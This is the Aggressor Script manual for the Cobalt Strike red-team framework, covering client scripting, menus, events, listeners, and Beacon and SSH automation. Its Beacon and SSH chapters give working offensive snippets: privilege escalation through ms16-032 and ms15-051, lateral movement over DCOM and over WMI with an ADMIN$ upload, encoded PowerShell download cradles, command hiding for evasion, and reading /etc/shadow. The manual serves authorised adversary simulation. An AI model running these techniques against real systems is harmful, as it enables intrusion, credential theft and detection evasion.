Aggressor Script
What is Aggressor Script?
Aggressor Script is the scripting language built into Cobalt Strike, version 3.0, and later. Aggressor Script allows you to modify and extend the Cobalt Strike client.

History
Aggressor Script is the spiritual successor to Cortana, the open source scripting engine in Armitage. Cortana was made possible by a contract through DARPA's Cyber Fast Track program. Cortana allows its users to extend Armitage and control the Metasploit Framework and its features through Armitage's team server. Cobalt Strike 3.0 is a ground-up rewrite of Cobalt Strike without Armitage as a foundation. This change afforded an opportunity to revisit Cobalt Strike's scripting and build something around Cobalt Strike's features. The result of this work is Aggressor Script.

Aggressor Script is a scripting language for red team operations and adversary simulations inspired by scriptable IRC clients and bots. Its purpose is two-fold. You may create long running bots that simulate virtual red team members, hacking side-by-side with you. You may also use it to extend and modify the Cobalt Strike client to your needs.

Status
Aggressor Script is part of Cobalt Strike 3.0's foundation. Most popup menus and the presentation of events in Cobalt Strike 3.0 are managed by the Aggressor Script engine. That said, Aggressor Script is still in its infancy. Strategic Cyber LLC has yet to build APIs for most of Cobalt Strike's features. Expect to see Aggressor Script evolve over time. This documentation is also a work in progress.

How to Load Scripts
Aggressor Script is built into the Cobalt Strike client. To permanently load a script, go to Cobalt Strike -> Script Manager and press Load.



figure 69 - Cobalt Strike Script Loader

The Script Console
Cobalt Strike provides a console to control and interact with your scripts. Through the console you may trace, profile, debug, and manage your scripts. The Aggressor Script console is available via View -> Script Console.

The following commands are available in the console:

Command	Arguments	What it does
?	"*foo*" iswm "foobar"	evaluate a sleep predicate and print result
e	println("foo");	evaluate a sleep statement
help		list all of the commands available
load	/path/to/script.cna	load an Aggressor Script script
ls		list all of the scripts loaded
proff	script.cna	disable the Sleep profiler for the script
profile	script.cna	dumps performance statistics for the script.
pron	script.cna	enables the Sleep profiler for the script
reload	script.cna	reloads the script
troff	script.cna	disable function trace for the script
tron	script.cna	enable function trace for the script
unload	script.cna	unload the script
x	2 + 2	evaluate a sleep expression and print result
 



figure 70 - Interacting with the script console

Headless Cobalt Strike
You may use Aggressor Scripts without the Cobalt Strike GUI. The agscript program (included with the Cobalt Strike Linux package) runs the headless Cobalt Strike client. The agscript program requires four arguments:

./agscript [host] [port] [user] [password]
These arguments connect the headless Cobalt Strike client to the team server you specify. The headless Cobalt Strike client presents the Aggressor Script console.

You may use agscript to immediately connect to a team server and run a script of your choosing. Use:

./agscript [host] [port] [user] [password] [/path/to/script.cna]
This command will connect the headless Cobalt Strike client to a team server, load your script, and run it. The headless Cobalt Strike client will run your script before it synchronizes with the team server. Use on ready to wait for the headless Cobalt Strike client to finish the data synchronization step.

on ready {
   println("Hello World! I am synchronized!");
   closeClient();
}
A Quick Sleep Introduction
Aggressor Script builds on Raphael Mudge's Sleep Scripting Language. The Sleep manual is available at http://sleep.dashnine.org/manual

Aggressor Script will do anything that Sleep does such as:

Sleep's syntax, operators, and idioms are similar to the Perl scripting language. There is one major difference that catches new programmers. Sleep requires whitespace between operators and their terms. The following code is not valid:

$x=1+2; # this will not parse!!
This statement is valid though:

$x = 1 + 2;
Sleep variables are called scalars and scalars hold strings, numbers in various formats, Java object references, functions, arrays, and dictionaries. Here are several assignments in Sleep:

$x = "Hello World";
$y = 3;
$z = @(1, 2, 3, "four");
$a = %(a => "apple", b => "bat", c => "awesome language", d => 4);
Arrays and dictionaries are created with the @ and % functions. Arrays and dictionaries may reference other arrays and dictionaries. Arrays and dictionaries may even reference themselves.
Comments begin with a # and go until the end of the line.
Sleep interpolates double-quoted strings. This means that any white-space separated token beginning with a $ sign is replaced with its value. The special variable $+ concatenates an interpolated string with another value.

println("\$a is: $a and \n\$x joined with \$y is: $x $+ $y");
This will print out:

$a is: %(d => 4, b => 'bat', c => 'awesome language', a => 'apple') and 
$x joined with $y is: Hello World3
There's a function called &warn. It works like &println, except it includes the current script name and a line number too. This is a great function to debug code with.
Sleep functions are declared with the sub keyword. Arguments to functions are labeled $1, $2, all the way up to $n. Functions will accept any number of arguments. The variable @_ is an array containing all of the arguments too. Changes to $1, $2, etc. will alter the contents of @_.

sub addTwoValues {
   println($1 + $2);
}
 
addTwoValues("3", 55.0);
This script prints out:

58.0
In Sleep, a function is a first-class type like any other object. Here are a few things that you may see:

$addf = &addTwoValues;
The $addf variable now references the &addTwoValues function. To call a function enclosed in a variable, use:

[$addf : "3", 55.0];
This bracket notation is also used to manipulate Java objects. I recommend reading the Sleep manual if you're interested in learning more about this. The following statements are equivalent and they do the same thing:

[$addf : "3", 55.0];
[&addTwoValues : "3", 55.0];
[{ println($1 + $2); } : "3", 55.0];
addTwoValues("3", 55.0);
Sleep has three variable scopes: global, closure-specific, and local. The Sleep manual covers this in more detail. If you see local('$x $y $z') in an example, it means that $x, $y, and $z are local to the current function and their values will disappear when the function returns. Sleep uses lexical scoping for its variables.
Sleep has all of the other basic constructs you'd expect in a scripting language. You should read the manual to learn more about it.

Interacting with the User
Aggressor Script displays output using Sleep's &println, &printAll, &writeb, and &warn functions. These functions display output to the script console.

Scripts may register commands as well. These commands allow scripts to receive a trigger from the user through the console. Use the command keyword to register a command:

command foo{
   println("Hello $1"); 
}
This code snippet registers the command foo. The script console automatically parses the arguments to a command and splits them by whitespace into tokens for you. $1 is the first token, $2 is the second token, and so on. Typically, tokens are separated by spaces but users may use "double quotes" to create a token with spaces. If this parsing is disruptive to what you'd like to do with the input, use $0 to access the raw text passed to the command.



figure 71 - Command Output

Colors
You may add color and styles to text that is output in Cobalt Strike's consoles. The \c, \U, and \o escapes tell Cobalt Strile how to format text. These escapes are parsed inside of double-quoted strings only.

The \cX escape colors the text that comes after it. X specifies the color. Your color choices are:



figure 72 - Color Options

The \U escape underlines the text that comes after it. A second \U stops the underline format.

The \o escape resets the format of the text that comes after it. A newline resets text formatting as well.



Cobalt Strike
The Cobalt Strike Client
The Aggressor Script engine is the glue feature in Cobalt Strike. Most Cobalt Strike dialogs and features are written as stand-alone modules that expose some interface to the Aggressor Script engine.

An internal script, default.cna, defines the default Cobalt Strike experience. This script defines Cobalt Strike's toolbar buttons, popup menus, and it also formats the output for most Cobalt Strike events.

This chapter will show you how these features work and empower you to shape the Cobalt Strike client to your needs.



figure 73 - The default.cna script

Keyboard Shortcuts
Scripts may create keyboard shortcuts. Use the bind keyword to bind a keyboard shortcut. This example shows Hello World! in a dialog box when Ctrl and H are pressed together.

bind Ctrl+H {
   show_message("Hello World!");
}
Keyboard shortcuts may be any ASCII characters or a special key. Shortcuts may have one or more modifiers applied to them. A modifier is one of: Ctrl, Shift, Alt, or Meta. Scripts may specify the modifier+key.

Popup Menus
Scripts may also add to Cobalt Strike's menu structure or re-define it. The popup keyword builds a menu hierarchy for a popup hook.

Here's the code that defines Cobalt Strike's help menu:

popup help {
   item("&Homepage", { url_open("https://www.cobaltstrike.com/"); });
   item("&Support",  { url_open("https://www.cobaltstrike.com/support"); });
   item("&Arsenal",  { url_open("https://www.cobaltstrike.com/scripts"); });
   separator();
   item("&Malleable C2 Profile", { openMalleableProfileDialog(); });
   item("&System Information", { openSystemInformationDialog(); });
   separator();
   item("&About", { openAboutDialog(); });
}
This script hooks into the help popup hook and defines several menu items. The & in the menu item name is its keyboard accelerator. The code block associated with each item executes when the user clicks on it.

Scripts may define menus with children as well. The menu keyword defines a new menu. When the user hovers over the menu, the block of code associated with it is executed and used to build the child menu.

Here's the Pivot Graph menu as an example of this:

popup pgraph {
   menu "&Layout" {
      item "&Circle"    { graph_layout($1, "circle"); }
      item "&Stack"     { graph_layout($1, "stack"); }
      menu "&Tree" {
         item "&Bottom" { graph_layout($1, "tree-bottom"); }
         item "&Left"   { graph_layout($1, "tree-left"); }
         item "&Right"  { graph_layout($1, "tree-right"); }
         item "&Top"    { graph_layout($1, "tree-top"); }
      }
      separator();
      item "&None" { graph_layout($1, "none"); }
   }
}
If your script specifies a menu hierarchy for a Cobalt Strike menu hook, it will add to the menus that are already in place. Use the &popup_clear function to clear the other registered menu items and re-define a popup hierarchy to your taste.

Custom Output
The set keyword in Aggressor Script defines how to format an event and present its output to the user. Here's an example of the set keyword:

set EVENT_SBAR_LEFT {
   return "[" . tstamp(ticks()) . "] " . mynick();
}
 
set EVENT_SBAR_RIGHT {
   return "[lag: $1 $+ ]";
}
The above code defines the content of the statusbar in Cobalt Strike's Event Log (View -> Event Log). The left side of this statusbar shows the current time and your nickname. The right side shows the round-trip time for a message between your Cobalt Strike client and the team server.

You may override any set option in the Cobalt Strike default script. Create your own file with definitions for events you care about. Load it into Cobalt Strike. Cobalt Strike will use your definitions over the built-in ones.

Events
Use the on keyword to define a handler for an event. The ready event fires when Cobalt Strike is connected to the team server and ready to act on your behalf.

on ready {
   show_message("Ready for action!");
}
Cobalt Strike generates events for a variety of situations. Use the * meta-event to watch all events Cobalt Strike fires.

on * {
   local('$handle $event $args');
 
   $event = shift(@_);
   $args  = join(" ", @_);
 
   $handle = openf(">>eventspy.txt");
   writeb($handle, "[ $+ $event $+ ] $args");
   closef($handle);
}




Data Model
Cobalt Strike's team server stores your hosts, services, credentials, and other information. It also broadcasts this information and makes it available to all clients.

Data API
Use the &data_query function to query Cobalt Strike's data model. This function has access to all state and information maintained by the Cobalt Strike client. Use &data_keys to get a list of the different pieces of data you may query. This example queries all data in Cobalt Strike's data model and exports it to a text file:

command export {
   local('$handle $model $row $entry $index');
   $handle = openf(">export.txt");
 
   foreach $model (data_keys()) {
      println($handle, "== $model ==");
      println($handle, data_query($model));
   }
 
   closef($handle);
 
   println("See export.txt for the data.");
}
Cobalt Strike provides several functions that make it more intuitive to work with the data model.

Model Function Description
applications   &applications  System Profiler Results [View -> Applications]
archives &archives   Engagement events/activities
beacons  &beacons Active beacons
credentials &credentials   Usernames, passwords, etc.
downloads   &downloads  Downloaded files
keystrokes  &keystrokes Keystrokes received by Beacon
screenshots &screenshots   Screenshots captured by Beacon
services &services   Services and service information
sites &sites   Assets hosted by Cobalt Strike
socks &pivots  SOCKS proxy servers and port forwards
targets  &targets Hosts and host information
These functions return an array with one row for each entry in the data model. Each entry is a dictionary with different key/value pairs that describe the entry.

The best way to understand the data model is to explore it through the Aggressor Script console. Go to View -> Script Console and use the x command to evaluate an expression. For example:



figure 74 - Querying Data from the Aggressor Script console

Use on DATA_KEY to subscribe to changes to a specific data model.

on keystrokes {
   println("I have new keystrokes: $1");
}





Listeners
Listeners are Cobalt Strike's abstraction on top of payload handlers. A listener is a name attached to payload configuration information (e.g., protocol, host, port, etc.) and, in some cases, a promise to setup a server to receive connections from the described payload.

Listener API
Aggressor Script aggregates listener information from all of the team servers you're currently connected to. This makes it easy to pass sessions to another team server. To get a list of all listener names, use the &listeners function. If you would like to work with local listeners only, use &listeners_local. The &listener_info function resolves a listener name to its configuration information. This example dumps all listeners and their configuration to the Aggressor Script console:

command listeners {
   local('$name $key $value');
   foreach $name (listeners()) {
      println("== $name == ");
      foreach $key => $value (listener_info($name)) {
         println("$[20]key : $value");
      }
   }
}
Creating Listeners
Use &listener_create_ext to create a listener and start a payload handler associated with it.

Choosing Listeners
Use &openPayloadHelper to open a dialog that lists all available listeners. After the user selects a listener, this dialog will close, and Cobalt Strike will run a callback function. Here's the source code for Beacon's spawn menu:

item "&Spawn" {
   openPayloadHelper(lambda({
      binput($bids, "spawn $1");
      bspawn($bids, $1);
   }, $bids => $1));
}
Stagers
A stager is a tiny program that downloads a payload and passes execution to it. Stagers are ideal for size-constrained payload delivery vector (e.g., a user-driven attack, a memory corruption exploit, or a one-liner command. Stagers do have downsides though. They introduce an additional component to your attack chain that is possible to disrupt. Cobalt Strike's stagers are based on the stagers in the Metasploit Framework and these are well-signatured and understood in memory as well. Use payload-specific stagers if you must; but it's best to avoid them otherwise.

Use &stager to export a payload stager tied to a Cobalt Strike payload. Not all payload options have an explicit payload stager. Not all stagers have x64 options.

The &artifact_stager function will export a PowerShell script, executable, or DLL that runs a stager associated with a Cobalt Strike payload.

Local Stagers
For post-exploitation actions that require the use of a stager, use a localhost-only bind_tcp stager. The use of this stager allows a staging-required post-exploitation action to work with all of Cobalt Strike's payloads equally.

Use &stager_bind_tcp to export a bind_tcp payload stager. Use &beacon_stage_tcp to deliver a payload to this stager.

&artifact_general will accept this arbitrary code and generate a PowerShell script, executable, or DLL to host it.

Named Pipe Stager
Cobalt Strike does have a bind_pipe stager that is useful for some lateral movement situations. This stager is x86 only. Use &stager_bind_pipe to export this bind_pipe stager. Use &beacon_stage_pipe to deliver a payload to this stager.

&artifact_general will accept this arbitrary code and generate a PowerShell script, executable, or DLL to host it.

Stageless Payloads
Use &payload to export a Cobalt Strike payload (in its entirety) as a ready-to-run position-independent program.

&artifact_payload will export a PowerShell script, executable, or DLL that containts this payload.





Beacon
Beacon is Cobalt Strike's asynchronous post-exploitation agent. In this chapter, we will explore options to automate Beacon with Cobalt Strike's Aggressor Script.

Metadata
Cobalt Strike assigns a session ID to each Beacon. This ID is a random number. Cobalt Strike associates tasks and metadata with each Beacon ID. Use &beacons to query metadata for all current Beacon sessions. Use &beacon_info to query metadata for a specific Beacon session. Here's a script to dump information about each Beacon session:

command beacons {
   local('$entry $key $value');
   foreach $entry (beacons()) {
      println("== " . $entry['id'] . " ==");
      foreach $key => $value ($entry) {
         println("$[20]key : $value");
      }
      println();
   }
}
Aliases
You may define new Beacon commands with the alias keyword. Here's a hello alias that prints Hello World in a Beacon console.

alias hello {
   blog($1, "Hello World!");
}
Put the above into a script, load it into Cobalt Strike, and open a Beacon console. Then enter in the hello command and press enter. Cobalt Strike will even tab complete your aliases for you. You should see Hello World! in the Beacon console.

You may also use the &alias function to define an alias.

Cobalt Strike passes the following arguments to an alias: $0 is the alias name and arguments without any parsing. $1 is the ID of the Beacon the alias was typed from. The arguments $2 and on contain an individual argument passed to the alias. The alias parser splits arguments by spaces. Users may use "double quotes" to group words into one argument.

alias saywhat {
   blog($1, "My arguments are: " . substr($0, 8) . "\n");
}
You may also register your aliases with Beacon's help system. Use &beacon_command_register to register a command.

Aliases are a convenient way to extend Beacon and make it your own. Aliases also play well into Cobalt Strike's threat emulation role. You may use aliases to script complex post-exploitation actions in a way that maps to another actor's tradecraft. Your red team operators simply need to load a script, learn the aliases, and they can operate with your scripted tactics in a way that's consistent with the actor you're emulating.

Reacting to new Beacons
A common use of Aggressor Script is to react to new Beacons. Use the beacon_initial event to setup commands that should run when a Beacon checks in for the first time.

on beacon_initial {
   # do some stuff
}
The $1 argument to beacon_initial is the ID of the new Beacon.

The beacon_initial event fires when a Beacon reports metadata for the first time. This means a DNS Beacon will not fire beacon_initial until its asked to run a command. To interact with a DNS Beacon that calls home for the first time, use the beacon_initial_empty event.

# some sane defaults for DNS Beacon
on beacon_initial_empty {
   bmode($1, "dns-txt");
   bcheckin($1);
}
Popup Menus
You may also add on to Beacons popup menu. Aliases are nice, but they only affect one Beacon at a time. Through a popup menu, your script's users may task multiple Beacons to take the desired action at one time.

The beacon_top and beacon_bottom popup hooks let you add to the default Beacon menu. The argument to the Beacon popup hooks is an array of selected Beacon IDs.

popup beacon_bottom {
   item "Run All..." {
      prompt_text("Which command to run?", "whoami /groups", lambda({
         binput(@ids, "shell $1");
         bshell(@ids, $1);
      }, @ids => $1));
   }
}
The Logging Contract
Cobalt Strike 3.0 and later do a decent job of logging. Each command issued to a Beacon is attributed to an operator with a date and timestamp. The Beacon console in the Cobalt Strike client handles this logging. Scripts that execute commands for the user do not record commands or operator attribution to the log. The script is responsible for doing this. Use the &binput function to do this. This command will post a message to the Beacon transcript as if the user had typed a command.

Acknowledging Tasks
Custom aliases should call the &btask function to describe the action the user asked for. This output is sent to the Beacon log and it's also used in Cobalt Strike's reports. Most Aggressor Script functions that issue a task to Beacon will print their own acknowledgement message. If you'd like to suppress this, add ! to the function name. This will run the quiet variant of the function. A quiet function does not print a task acknowledgement. For example, &bshell! is the quiet variant of &bshell.

alias survey {
   btask($1, "Surveying the target!", "T1082");
   bshell!($1, "echo Groups && whoami /groups");
   bshell!($1, "echo Processes && tasklist /v");
   bshell!($1, "echo Connections && netstat -na | findstr \"EST\"");
   bshell!($1, "echo System Info && systeminfo");
}
The last argument to &btask is a comma-separated list of ATT&CK techniques. T1082 is System Information Discovery. ATT&CK is a project from the MITRE Corporation to categorize and document attacker actions. Cobalt Strike uses these techniques to build its Tactics, Techniques, and Procedures report. You may learn more about MITRE's ATT&CK matrix at:

https://attack.mitre.org/

Conquering the Shell
Aliases may override existing commands. Here's an Aggressor Script implementation of Beacon's powershell command:

alias powershell {
   local('$args $cradle $runme $cmd');
   
   # $0 is the entire command with no parsing.
   $args   = substr($0, 11);
   
   # generate the download cradle (if one exists) for an imported PowerShell script
   $cradle = beacon_host_imported_script($1);
   
   # encode our download cradle AND cmdlet+args we want to run
   $runme  = base64_encode( str_encode($cradle . $args, "UTF-16LE") );
   
   # Build up our entire command line.
   $cmd    = " -nop -exec bypass -EncodedCommand \" $+ $runme $+ \"";
   
   # task Beacon to run all of this.
   btask($1, "Tasked beacon to run: $args", "T1086");
   beacon_execute_job($1, "powershell", $cmd, 1);
}
This alias defines a powershell command for use within Beacon. We use $0 to grab the desired PowerShell string without any parsing. It's important to account for an imported PowerShell script (if the user imported one with powershell-import). We use &beacon_host_imported_script for this. This function tasks Beacon to host an imported script on a one-off webserver bound to localhost. It also returns a string with the PowerShell download cradle that downloads and evaluates the imported script. The -EncodedCommand flag in PowerShell accepts a script as a base64 string. There's one wrinkle. We must encode our string as little endian UTF16 text. This alias uses &str_encode to do this. The &btask call logs this run of PowerShell and associates it with tactic T1086. The &beacon_execute_job function tasks Beacon to run powershell and report its output back to Beacon.

Similarly, we may re-define the shell command in Beacon too. This alias creates an alternate shell command that hides your Windows commands in an environment variable.

alias shell {
   local('$args');
   $args = substr($0, 6);
   btask($1, "Tasked beacon to run: $args (OPSEC)", "T1059");
   bsetenv!($1, "_", $args);
   beacon_execute_job($1, "%COMSPEC%", " /C %_%", 0);
}
The &btask call logs our intention and associates it with tactic T1059. The &bsetenv assigns our Windows command to the environment variable _. The script uses ! to suppress &bsetenv's task acknowledgement. The &beacon_execute_job function runs %COMSPEC% with argumnents /C %_%. This works because &beacon_execute_job will resolve environment variables in the command parameter. It does not resolve environment variables in the argument parameter. Because of this, we can use %COMSPEC% to locate the user's shell, but pass %_% as an argument without immediate interpolation.

Privilege Escalation (Run a Command)
Beacon's runasadmin command attempts to run a command in an elevated context. This command accepts an elevator name and a command (command AND arguments :)). The &beacon_elevator_register function makes a new elevator available to runasadmin..

beacon_elevator_register("ms16-032", "Secondary Logon Handle Privilege Escalation (CVE-2016-099)", &ms16_032_elevator);
This code registers the elevator ms16-032 with Beacon's runasadmin command. A description is given as well. When the user types runasadmin ms16-032 notepad.exe, Cobalt Strike will run &ms16_032_elevator with these arguments: $1 is the beacon session ID. $2 is the command and arguments. Here's the &ms16_032_elevator function:

# Integrate ms16-032
# Sourced from Empire: https://github.com/EmpireProject/Empire/tree/master/data/module_source/privesc
sub ms16_032_elevator {
   local('$handle $script $oneliner');
   
   # acknowledge this command
   btask($1, "Tasked Beacon to execute $2 via ms16-032", "T1068");
   
   # read in the script
   $handle = openf(getFileProper(script_resource("modules"), "Invoke-MS16032.ps1"));
   $script = readb($handle, -1);
   closef($handle);
   
   # host the script in Beacon
   $oneliner = beacon_host_script($1, $script);
   
   # run the specified command via this exploit.
   bpowerpick!($1, "Invoke-MS16032 -Command \" $+ $2 $+ \"", $oneliner);
}
This function uses &btask to acknowledge the action to the user. The description in &btask will go in Cobalt Strike's logs and reports as well. T1068 is the MITRE ATT&CK technique that corresponds to this action.

The end of this function uses &bpowerpick to run Invoke-MS16032 with an argument to run our command. The PowerShell script that implements Invoke-MS16032 is too large for a one-liner though. To mitigate this, the elevator function uses &beacon_host_script to host the large script within Beacon. The &beacon_host_script function returns a one-liner to grab this hosted script and evaluate it.

The exclamation point after &bpowerpick tells Aggressor Script to call the quiet variants of this function. Quiet functions do not print a task description.

There's not much else to describe here. A command elevator script just needs to run a command. :)

Privilege Escalation (Spawn a Session)
Beacon's elevate command attempts to spawn a new session with elevated privileges. This command accepts an exploit name and a listener. The &beacon_exploit_register function makes a new exploit available to elevate.

beacon_exploit_register("ms15-051", "Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)", &ms15_051_exploit);
This code registers the exploit ms15-051 with Beacon's elevate command. A description is given as well. When the user types elevate ms15-051 foo, Cobalt Strike will run &ms15_051_exploit with these arguments: $1 is the beacon session ID. $2 is the listener name (e.g., foo). Here's the &ms15_051_exploit function:

# Integrate windows/local/ms15_051_client_copy_image from Metasploit
# https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms15_051_client_copy_image.rb
sub ms15_051_exploit {
      local('$stager $arch $dll');

   # acknowledge this command
   btask($1, "Task Beacon to run " . listener_describe($2) . " via ms15-051", "T1068");

   # tune our parameters based on the target arch
   if (-is64 $1) {
      $arch   = "x64";
      $dll    = getFileProper(script_resource("modules"), "cve-2015-1701.x64.dll");
   }
   else {
      $arch   = "x86";
      $dll    = getFileProper(script_resource("modules"), "cve-2015-1701.x86.dll");
   }

   # generate our shellcode
   $stager = payload($2, $arch);

   # spawn a Beacon post-ex job with the exploit DLL
   bdllspawn!($1, $dll, $stager, "ms15-051", 5000);

   # link to our payload if it's a TCP or SMB Beacon
   beacon_link($1, $null, $2);
}
This function uses &btask to acknowledge the action to the user. The description in &btask will go in Cobalt Strike's logs and reports as well. T1068 is the MITRE ATT&CK technique that corresponds to this action.

This function repurposes an exploit from the Metasploit Framework. This exploit is compiled as cve-2015-1701.[arch].dll with x86 and x64 variants. This function's first task is to read the exploit DLL that corresponds to the target system's architecture. The -is64 predicate helps with this.

The &payload function generates raw output for our listener name and the specified architecture.

The &bdllspawn function spawns a temporary process, injects our exploit DLL into it, and passes our exported payload as an argument. This is the contract the Metasploit Framework uses to pass shellcode to its privilege escalation exploits implemented as Reflective DLLs.

Finally, this function calls &beacon_link. If the target listener is an SMB or TCP Beacon payload, &beacon_link will attempt to connect to it.

Lateral Movement (Run a Command)
Beacon's remote-exec command attempts to run a command on a remote target. This command accepts a remote-exec method, a target, and a command + arguments. The &beacon_remote_exec_method_register function is both a really long function name and makes a new method available to remote-exec.

beacon_remote_exec_method_register("com-mmc20", "Execute command via MMC20.Application COM Object", &mmc20_exec_method);
This code registers the remote-exec method com-mmc20 with Beacon's remote-exec command. A description is given as well. When the user types remote-exec com-mmc20 c:\windows\temp\malware.exe, Cobalt Strike will run &mmc20_exec_method with these arguments: $1 is the beacon session ID. $2 is the target. $3 is the command and arguments. Here's the &mmc20_exec_method function:

sub mmc20_exec_method {
   local('$script $command $args');

   # state what we're doing.
   btask($1, "Tasked Beacon to run $3 on $2 via DCOM", "T1175");

   # separate our command and arguments
   if ($3 ismatch '(.*?) (.*)') {
      ($command, $args) = matched();
   }
   else {
      $command = $3;
      $args    = "";
   }
    
   # build script that uses DCOM to invoke ExecuteShellCommand on MMC20.Application object
   $script  = '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "';
   $script .= $2;
   $script .=  '")).Document.ActiveView.ExecuteShellCommand("';
   $script .= $command;
   $script .= '", $null, "';   
   $script .= $args;
   $script .= '", "7");';

   # run the script we built up
   bpowershell!($1, $script, "");
}
This function uses &btask to acknowledge the task and describe it to the operator (and logs and reports). T1175 is the MITRE ATT&CK technique that corresponds to this action. If your offense technique does not fit into MITRE ATT&CK, don't fret. Some customers are very much ready for a challenge and benefit when their red team creatively deviates from what are known offense techniques. Do consider writing a blog post about it for the rest of us later.

This function then splits the $3 argument into command and argument portions. This is done because the technique requires that these values are separate.

Afterwards, this function builds up a PowerShell command string that looks like this:

[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "TARGETHOST")).Document.ActiveView.ExecuteShellCommand("c:\windows\temp\a.exe", $null, "", "7");
This command uses the MMC20.Application COM object to execute a command on a remote target. This method was discovered as a lateral movement option by Matt Nelson:

https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/

This function uses &bpowershell to run this PowerShell script. The second argument is an empty string to suppress the default download cradle (if the operator ran powershell-import previously). If you prefer, you could modify this example to use &bpowerpick to run this one-liner without powershell.exe.

This example is one of the major motivators for me to add the remote-exec command and API to Cobalt Strike. This is an excellent "execute this command" primitive, but end-to-end weaponization (spawning a session) usually includes using this primitive to run a PowerShell one-liner on target. For a lot of reasons, this is not the right choice in many engagements. Exposing this primitive through the remote-exec interface gives you a choice about how to best make use of this capability (without forcing choices you don't want made for you).

Lateral Movement (Spawn a Session)
Beacon's jump command attempts to spawn a new session on a remote target. This command accepts an exploit name, a target, and a listener. The &beacon_remote_exploit_register function makes a new module available to jump.

beacon_remote_exploit_register("wmi", "x86", "Use WMI to run a Beacon payload", lambda(&wmi_remote_spawn, $arch => "x86"));
beacon_remote_exploit_register("wmi64", "x64", "Use WMI to run a Beacon payload", lambda(&wmi_remote_spawn, $arch => "x64"));
The above functions register wmi and wmi64 options for use with the jump command. The &lambda function makes a copy of &wmi_remote_spawn and sets $arch as a static variable scoped to that function copy. Using this method, we're able to use the same logic to present two lateral movement options from one implementation. Here's the &wmi_remote_spawn function:

# $1 = bid, $2 = target, $3 = listener
sub wmi_remote_spawn {
   local('$name $exedata');

   btask($1, "Tasked Beacon to jump to $2 (" . listener_describe($3) . ") via WMI", "T1047");

   # we need a random file name.
   $name = rand(@("malware", "evil", "detectme")) . rand(100) . ".exe";

   # generate an EXE. $arch defined via &lambda when this function was registered with
   # beacon_remote_exploit_register
   $exedata = artifact_payload($3, "exe", $arch);

   # upload the EXE to our target (directly)
   bupload_raw!($1, "\\\\ $+ $2 $+ \\ADMIN\$\\ $+ $name", $exedata);

   # execute this via WMI
   brun!($1, "wmic /node:\" $+ $2 $+ \" process call create \"\\\\ $+ $2 $+ \\ADMIN\$\\ $+ $name $+ \"");

   # assume control of our payload (if it's an SMB or TCP Beacon)
   beacon_link($1, $2, $3);
}
The &btask function fulfills our obligation to log what the user intended to do. The T1047 argument associates this action with Tactic 1047 in MITRE's ATT&CK matrix.

The &artfiact_payload function generates a stageless artifact to run our payload. It uses the Artifact Kit hooks to generate this file.

The &bupload_raw function uploads the artifact data to the target. This function uses \\target\ADMIN$\filename.exe to directly write the EXE to the remote target via an admin-only share.

&brun runs wmic /node:"target" process call create "\\target\ADMIN$\filename.exe" to execute the file on the remote target.

&beacon_link assumes control of the payload, if it's an SMB or TCP Beacon.       





SSH Sessions
Cobalt Strike's SSH client speaks the SMB Beacon protocol and implements a sub-set of Beacon's commands and functions. From the perspective of Aggressor Script, an SSH session is a Beacon session with fewer commands.

What type of session is it?
Much like Beacon sessions, SSH sessions have an ID. Cobalt Strike associates tasks and metadata with this ID. The &beacons function will also return information about all Cobalt Strike sessions (SSH sessions AND Beacon sessions). Use the -isssh predicate to test if a session is an SSH session. The -isbeacon predicate tests if a session is a Beacon session.

Here's a function to filter &beacons to SSH sessions only:

sub ssh_sessions {
   return map({
      if (-isssh $1['id']) {
         return $1;
      }
      else {
         return $null;
      }
   }, beacons());
}
Aliases
You may add commands to the SSH console with the ssh_alias keyword. Here's a script to alias hashdump to grab /etc/shadow if you're an admin.

ssh_alias hashdump {
   if (-isadmin $1) {
      bshell($1, "cat /etc/shadow");
   }
   else {
      berror($1, "You're (probably) not an admin");
   }
}
Put the above into a script, load it into Cobalt Strike, and type hashdump inside of an SSH console. Cobalt Strike will tab complete SSH aliases too.

You may also use the &ssh_alias function to define an SSH alias.

Cobalt Strike passes the following arguments to an alias: $0 is the alias name and arguments without any parsing. $1 is the ID of the session the alias was typed from. The arguments $2 and on contain an individual argument passed to the alias. The alias parser splits arguments by spaces. Users may use "double quotes" to group words into one argument.

You may also register your aliases with the SSH console's help system. Use &ssh_command_register to register a command.

Reacting to new SSH Sessions
Aggressor Scripts may react to new SSH sessions too. Use the ssh_initial event to setup commands that should run when a SSH session becomes available.

on ssh_initial {
   # do some stuff
}
The $1 argument to ssh_initial is the ID of the new session.

Popup Menus
You may also add on to the SSH popup menu. The ssh popup hook lets you add items to the SSH menu. The argument to the SSH popup menu is an array of selected session IDs.

popup ssh {
   item "Run All..." {
      prompt_text("Which command to run?", "w", lambda({
         binput(@ids, "shell $1");
         bshell(@ids, $1);
      }, @ids => $1));
   }
}
You'll notice that this example is very similar to the example used in the Beacon chapter. For example, I use &binput to publish input to the SSH console. I use &bshell to task the SSH session to run a command. This is all correct. Remember, internally, an SSH session is a Beacon session as far as most of Cobalt Strike/Aggressor Script is concerned.




Other Topics
Cobalt Strike operators and scripts communicate global events to the shared event log. Aggressor Scripts may respond to this information too. The event log events begin with event_. To list for global notifications, use the event_notify hook.

on event_notify {
   println("I see: $1");
}
To post a message to the shared event log, use the &say function.

say("Hello World");
To post a major event or notification (not necessarily chit-chat), use the &elog function. The deconfliction server will automatically timestamp and store this information. This information will also show up in Cobalt Strike's Activity Report.

elog("system shutdown initiated");
Timers
If you'd like to execute a task periodically, then you should use one of Aggressor Script's timer events. These events are heartbeat_X, where X is 1s, 5s, 10s, 15s, 30s, 1m, 5m, 10m, 15m, 20m, 30m, or 60m.

on heartbeat_10s {
   println("I happen every 10 seconds");
}
Dialogs
Aggressor Script provides several functions to present and request information from the user. Use &show_message to prompt the user with a message. Use &show_error to prompt the user with an error.

bind Ctrl+M {
   show_message("I am a message!");
}
Use &prompt_text to create a dialog that asks the user for text input.

prompt_text("What is your name?", "Joe Smith", {
   show_message("Please $1 $+ , pleased to meet you");
});
The &prompt_confirm function is similar to &prompt_text, but instead it asks a yes/no question.

Custom Dialogs
